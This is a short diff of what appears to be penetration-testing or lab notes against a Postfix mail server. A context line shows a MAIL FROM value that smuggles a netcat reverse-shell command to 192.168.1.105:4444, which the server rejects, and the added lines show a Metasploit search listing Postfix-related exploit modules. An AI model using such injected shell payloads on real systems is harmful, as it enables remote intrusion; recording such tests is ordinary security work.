@@ -157,3 +157,20 @@ MAIL FROM:<frankie;nc -e /bin/sh 192.168.1.105 4444>
 501 5.1.7 Bad sender address syntax
 
 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+msf > search postfix
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/linux/misc/gld_postfix                    2005-04-12       good       No     GLD (Greylisting Daemon) Postfix Buffer Overflow
+   1  auxiliary/admin/http/pfadmin_set_protected_alias  2017-02-03       normal     Yes    Postfixadmin Protected Alias Deletion Vulnerability
+   2  exploit/linux/local/zimbra_postfix_priv_esc       2022-10-13       excellent  Yes    Zimbra sudo + postfix privilege escalation
+
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/local/zimbra_postfix_priv_esc
+
+msf > 
+
